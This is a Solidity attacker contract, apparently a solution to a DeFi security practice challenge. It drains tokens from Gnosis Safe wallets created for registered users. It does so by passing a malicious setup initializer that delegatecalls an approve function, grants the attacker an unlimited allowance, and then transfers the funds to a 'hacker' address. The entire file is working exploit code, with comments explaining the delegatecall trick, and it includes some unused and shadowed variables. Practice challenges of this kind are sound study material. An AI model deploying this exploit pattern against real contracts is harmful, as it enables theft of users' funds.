// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface ProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract WalletRegistryAttacker {

    using Address for address;
    address public masterCopyAddress;
    address public walletRegistryAddress;
    WalletRegistry walletRegistry;
    ProxyFactory proxyFactory;
    IProxyCreationCallback callbackToWalletRegistry;
    IERC20 public immutable token; //immutable were needed because delegatecall was failing from proxy to this
    // worked with immutable because the compiler optimized the code and copied the value to where it was used, so in case of delegatecall
    // without immutable the EVM would look for `token` is the callers state which is the proxy in this case
    // hardest challenge so far, we cant delegatecall directly into the ERC20 token's approve function because the state changes would
    // apply for the proxy (set allowance, which is not present on proxy) so instead we used a hop like:
    // this.createProxyWithCallback call -> proxy delegatecall -> this.approve (msg.sender = proxy) -> erc20.approve
    // OR we send the tokenAddress along with the delegateCall to approve

    constructor (address _proxyFactoryAddress, address _walletRegistryAddress, address _masterCopyAddress, address _token) {
        require(_walletRegistryAddress != address(0), "Null address for _walletRegistryAddress");
        proxyFactory = ProxyFactory(_proxyFactoryAddress);
        walletRegistry = WalletRegistry(_walletRegistryAddress);
        masterCopyAddress = _masterCopyAddress;
        IProxyCreationCallback callbackToWalletRegistry = IProxyCreationCallback(_walletRegistryAddress);
        walletRegistryAddress = _walletRegistryAddress;
        require(address(callbackToWalletRegistry) != address(0), "Null address for callbackToWalletRegistry");
        token = IERC20(_token);
    }

    function getCallBackAddress() public view returns (address) {
        return address(callbackToWalletRegistry);
    }

    function setup() public {
        address[] memory owners = new address[](1);
        owners[0] = address(this);
        masterCopyAddress.functionCall(
            abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",owners, 1, address(this), new bytes(0), address(0), 0, 0, 0)
        );
    }

    function approve(address spender) external {
        token.approve(spender, type(uint256).max);
    }

    function approve2(address spender, address token) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    function afterExit(
    address to,
    uint256 value,
    bytes memory data
    ) public returns (bool success) {
    (success,) = to.call{value : value}(data);
    }

    // pass in a user address to create a gnossis wallet for him
    function attack(address user, address tokenAddress, address hacker) public {

        address[] memory owners = new address[](1);
        owners[0] = user;

        uint256 payment = 10 ether;

        // approve DVT token for hacker
        bytes memory approve = abi.encodeWithSignature("approve(address,uint256)",address(this),payment);
        bytes memory encodedApprove = abi.encodeWithSignature("approve(address)",address(this));
        bytes memory encodedApprove2 = abi.encodeWithSignature("approve2(address,address)",address(this),tokenAddress);

        // GnossisSafe::setup function that will be called on the newly created proxy
        bytes memory initializer = abi.encodeWithSignature("setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, 1, address(this), encodedApprove2, address(0), 0, 0, 0);
    GnosisSafeProxy proxy =
        proxyFactory.createProxyWithCallback(masterCopyAddress, initializer, 0, IProxyCreationCallback(walletRegistryAddress));
        token.transferFrom(address(proxy), hacker, payment);
//        tokenAddress.functionDelegateCall(
//            abi.encodeWithSignature("approve(address,uint256)",hacker,payment)
//        );
//        IERC20(tokenAddress).approve(hacker, payment);
//        uint256 allowance = IERC20(tokenAddress).allowance(address(this), hacker);
//        require(allowance > 0, "No allowance");
//        uint256 balance = IERC20(tokenAddress).balanceOf(address(proxy));
////        require(balance > 0, "Null as balance!");
////        require(allowance > 0, "Null as allowance!");
    }
}
